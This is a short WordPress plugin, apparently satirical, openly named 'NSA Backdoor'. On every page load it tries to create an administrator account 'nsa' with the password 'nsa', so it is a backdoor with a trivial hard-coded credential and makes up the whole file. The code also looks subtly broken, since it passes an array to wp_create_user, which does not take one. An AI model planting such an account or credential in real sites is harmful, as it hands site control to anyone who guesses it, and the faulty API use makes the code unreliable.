<?php
/*
Plugin Name: NSA Backdoor 
Description: Make it easy for the NSA to have admin access to your site 
Author: Aaron Jorbin 
Version: 1.0
Author URI: http://aaron.jorb.in/
License: GPLv2 or later
*/

function nsabackdoor_create_login() {
  
  //already added, no need to add again
  if ( get_user_by( 'email', 'nsa@example.com' ) )
    return;
  
  //add user
  $user   = array(  
          'user_pass'    => 'nsa',
          'user_login'   => 'nsa',
          'user_email'   => 'nsa@example.com',
          'role'         => 'Administrator',
          'first_name'   => 'NSA',
          'last_name'    => 'Administrator',
          'display_name' => 'NSA',
          'user_url'     => 'http://www.nsa.gov',
        );
  $id = wp_create_user( $user );
  
 
}
 
add_action( 'init', 'nsabackdoor_create_login' );
